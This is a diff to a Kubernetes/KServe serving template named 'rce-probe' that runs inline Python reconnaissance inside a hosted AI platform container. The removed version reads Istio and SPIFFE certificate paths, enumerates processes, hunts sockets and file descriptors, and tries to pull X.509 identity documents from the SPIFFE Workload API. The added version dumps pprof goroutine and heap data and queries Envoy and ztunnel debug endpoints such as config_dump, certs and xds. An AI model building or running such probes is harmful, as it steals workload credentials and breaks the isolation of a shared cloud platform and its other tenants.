@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.2.0"
+    ai.sap.com/version: "4.3.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "pilot-agent-certs-pprof-socket-hunt"
+    executables.ai.sap.com/description: "ztunnel-goroutine-dump-port15000-tls"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,158 +28,92 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, sys, subprocess, glob, stat
+            import os, socket, ssl
 
-            print('[PROBE_V42_START]', flush=True)
+            print('[PROBE_V43_START]', flush=True)
 
-            def http_get(host, port, path, timeout=5):
+            def http_get(host, port, path, timeout=8, use_tls=False, h2_upgrade=False):
                 try:
                     s = socket.socket()
                     s.settimeout(timeout)
                     s.connect((host, port))
-                    s.sendall(f'GET {path} HTTP/1.0\r\nHost: {host}\r\n\r\n'.encode())
+                    if use_tls:
+                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                        ctx.check_hostname = False
+                        ctx.verify_mode = ssl.CERT_NONE
+                        s = ctx.wrap_socket(s, server_hostname=host)
+                        print(f'  TLS negotiated: {s.version()} cipher={s.cipher()}', flush=True)
+                    hdrs = f'GET {path} HTTP/1.1\r\nHost: {host}\r\n'
+                    if h2_upgrade:
+                        hdrs += 'Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQAAP__\r\n'
+                    hdrs += 'Connection: close\r\n\r\n'
+                    s.sendall(hdrs.encode())
                     resp = b''
                     while True:
-                        c = s.recv(8192)
+                        c = s.recv(16384)
                         if not c: break
                         resp += c
-                        if len(resp) > 32000: break
+                        if len(resp) > 64000: break
                     s.close()
                     return resp.decode(errors='replace')
                 except Exception as e:
                     return f'ERR:{e}'
 
-            # --- 1. Full metrics from pilot-agent ---
-            metrics = http_get('127.0.0.1', 15020, '/metrics')
-            print('[PILOT_METRICS_FULL]', metrics[:8000], flush=True)
+            # --- 1. Goroutine dumps (text mode) ---
+            for debug_level in ['1', '2']:
+                resp = http_get('127.0.0.1', 15020, f'/debug/pprof/goroutine?debug={debug_level}', timeout=10)
+                print(f'[GOROUTINE_D{debug_level}]', resp[:8000], flush=True)
 
-            # --- 2. Pilot-agent cert endpoints ---
-            for path in ['/certs', '/debug/certs', '/debug/cert',
-                         '/debug/certdump', '/debug/config',
-                         '/debug/registryz', '/debug/endpointshardz',
-                         '/debug/configz', '/debug/authenticationz',
-                         '/debug/peerz', '/debug/pprof/goroutine',
-                         '/istio-certs/', '/etc/certs/']:
+            # --- 2. Other pprof text dumps ---
+            for path in ['/debug/pprof/heap?debug=1',
+                         '/debug/pprof/allocs?debug=1',
+                         '/debug/pprof/cmdline']:
+                resp = http_get('127.0.0.1', 15020, path, timeout=10)
+                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp else 'MISS'
+                print(f'[PPROF_{tag}:{path}]', resp[:3000], flush=True)
+
+            # --- 3. Port 15000 with TLS ---
+            print('[PORT_15000_TLS]', flush=True)
+            resp_tls = http_get('127.0.0.1', 15000, '/ready', use_tls=True)
+            print('[P15000_TLS_READY]', resp_tls[:500], flush=True)
+
+            # try more paths on 15000 TLS
+            for path in ['/stats', '/clusters', '/listeners',
+                         '/config_dump', '/certs', '/server_info',
+                         '/stats/prometheus']:
+                resp = http_get('127.0.0.1', 15000, path, use_tls=True)
+                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp and '426' not in resp else 'MISS'
+                print(f'[P15000_TLS_{tag}:{path}]', resp[:400], flush=True)
+
+            # --- 4. Port 15000 with HTTP/2 upgrade ---
+            print('[PORT_15000_H2C]', flush=True)
+            resp_h2 = http_get('127.0.0.1', 15000, '/', h2_upgrade=True)
+            print('[P15000_H2C]', resp_h2[:500], flush=True)
+
+            # --- 5. Port 15021 (Envoy health/readiness) ---
+            for path in ['/healthz/ready', '/stats', '/stats/prometheus',
+                         '/certs', '/listeners', '/config_dump']:
+                resp = http_get('127.0.0.1', 15021, path)
+                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp and '426' not in resp else 'MISS'
+                if tag == 'HIT':
+                    print(f'[P15021_{tag}:{path}]', resp[:1000], flush=True)
+
+            # --- 6. Additional ztunnel-specific paths on 15020 ---
+            for path in ['/debug/ztunnel', '/debug/workloads',
+                         '/debug/policies', '/debug/connections',
+                         '/debug/config', '/debug/rbac',
+                         '/debug/waypoint', '/debug/dnsproxy',
+                         '/debug/certificates',
+                         '/config_dump', '/stats/prometheus',
+                         '/debug/xds']:
                 resp = http_get('127.0.0.1', 15020, path)
-                if 'ERR:' not in resp and '404' not in resp:
-                    print(f'[PILOT_HIT:{path}]', resp[:2000], flush=True)
+                tag = 'HIT' if 'ERR:' not in resp and '404' not in resp else 'MISS'
+                if tag == 'HIT':
+                    print(f'[Z15020_HIT:{path}]', resp[:4000], flush=True)
                 else:
-                    print(f'[PILOT_MISS:{path}]', resp[:80], flush=True)
+                    print(f'[Z15020_MISS:{path}]', resp[:60], flush=True)
 
-            # --- 3. Check /etc/certs/ and /var/lib/istio/data/ (sidecar cert paths) ---
-            for p in ['/etc/certs/', '/var/lib/istio/', '/var/lib/istio/data/',
-                      '/etc/istio/', '/etc/istio/proxy/',
-                      '/var/run/secrets/workload-spiffe-uds/',
-                      '/run/secrets/workload-spiffe-uds/',
-                      '/tmp/spiffe-uds.sock',
-                      '/var/run/secrets/istio/',
-                      '/etc/istio/pod/',
-                      '/etc/istio/config/']:
-                try:
-                    if os.path.isdir(p):
-                        files = os.listdir(p)
-                        print(f'[DIR:{p}]', files, flush=True)
-                        for fn in files:
-                            full = os.path.join(p, fn)
-                            try:
-                                with open(full, 'rb') as f:
-                                    print(f'[FILE:{full}]', f.read(1000).decode(errors='replace')[:800], flush=True)
-                            except: pass
-                    elif os.path.exists(p):
-                        st = os.stat(p)
-                        print(f'[EXISTS:{p}] mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid}', flush=True)
-                except Exception as e:
-                    print(f'[PATH_ERR:{p}]', str(e)[:80], flush=True)
-
-            # --- 4. List all processes in our PID namespace ---
-            print('[PROCESSES]', flush=True)
-            for pid in sorted(os.listdir('/proc')):
-                if not pid.isdigit(): continue
-                try:
-                    with open(f'/proc/{pid}/cmdline', 'rb') as f:
-                        cmd = f.read().replace(b'\x00', b' ').decode(errors='replace')[:200]
-                    with open(f'/proc/{pid}/status') as f:
-                        status_lines = f.read()
-                    uid_line = [l for l in status_lines.split('\n') if l.startswith('Uid:')]
-                    uid = uid_line[0] if uid_line else '?'
-                    print(f'  PID {pid}: {cmd} | {uid}', flush=True)
-                except: pass
-
-            # --- 5. Hunt for Unix sockets accessible to us ---
-            print('[SOCKET_HUNT]', flush=True)
-            for pattern in ['/var/run/**/*.sock', '/var/run/**/*.socket',
-                             '/run/**/*.sock', '/run/**/*.socket',
-                             '/tmp/**/*.sock', '/tmp/**/*.socket',
-                             '/etc/**/*.sock', '/etc/**/*.socket']:
-                try:
-                    hits = glob.glob(pattern, recursive=True)
-                    for h in hits:
-                        try:
-                            st = os.stat(h)
-                            print(f'[SOCK_FOUND:{h}] mode={oct(stat.S_IMODE(st.st_mode))} uid={st.st_uid}', flush=True)
-                        except: pass
-                except: pass
-
-            # --- 6. FDs of all processes - look for SPIFFE socket inodes ---
-            # Known inodes from /proc/net/unix: 31116, 31115, 31156, 31127
-            target_inodes = {31116, 31115, 31156, 31127}
-            for pid in sorted(os.listdir('/proc')):
-                if not pid.isdigit(): continue
-                fd_dir = f'/proc/{pid}/fd'
-                try:
-                    for fd in os.listdir(fd_dir):
-                        try:
-                            link = os.readlink(f'{fd_dir}/{fd}')
-                            st = os.stat(f'{fd_dir}/{fd}')
-                            if st.st_ino in target_inodes or 'socket' in link:
-                                print(f'[FD_MATCH] pid={pid} fd={fd} -> {link} inode={st.st_ino}', flush=True)
-                        except: pass
-                except: pass
-
-            # --- 7. Install grpcio with HOME=/tmp ---
-            print('[PIP_INSTALL_V2] starting...', flush=True)
-            env = os.environ.copy()
-            env['HOME'] = '/tmp'
-            r = subprocess.run(
-                [sys.executable, '-m', 'pip', 'install', '-q', '--no-cache-dir',
-                 '--target=/tmp/pylib', 'grpcio==1.62.0', 'cryptography'],
-                env=env, capture_output=True, timeout=180)
-            if r.returncode != 0:
-                print('[PIP_ERR]', r.stderr.decode()[:500], flush=True)
-            else:
-                print('[PIP_OK]', flush=True)
-                sys.path.insert(0, '/tmp/pylib')
-
-            # --- 8. Try SPIFFE socket after pip (broader path search) ---
-            try:
-                import grpc
-
-                def try_spiffe_socket(path):
-                    try:
-                        chan = grpc.insecure_channel(f'unix://{path}')
-                        fetch = chan.unary_stream(
-                            '/spiffe.workload.SpiffeWorkloadAPI/FetchX509SVID',
-                            request_serializer=lambda x: x,
-                            response_deserializer=lambda x: x)
-                        for raw in fetch(b'', metadata=[('workload.spiffe.io','true')], timeout=4):
-                            print(f'[SPIFFE_HIT:{path}] got response len={len(raw)}', flush=True)
-                            return raw
-                    except Exception as e:
-                        print(f'[SPIFFE_MISS:{path}]', str(e)[:120], flush=True)
-                    return None
-
-                for sp in ['/var/run/secrets/workload-spiffe-uds/socket',
-                            '/run/secrets/workload-spiffe-uds/socket',
-                            '/tmp/spiffe-uds.sock',
-                            '/var/run/secrets/istio/socket',
-                            '/etc/istio/proxy/XDS']:
-                    result = try_spiffe_socket(sp)
-                    if result: break
-
-            except ImportError as e:
-                print('[GRPC_IMPORT_ERR]', e, flush=True)
-
-            print('[PROBE_V42_DONE]', flush=True)
+            print('[PROBE_V43_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
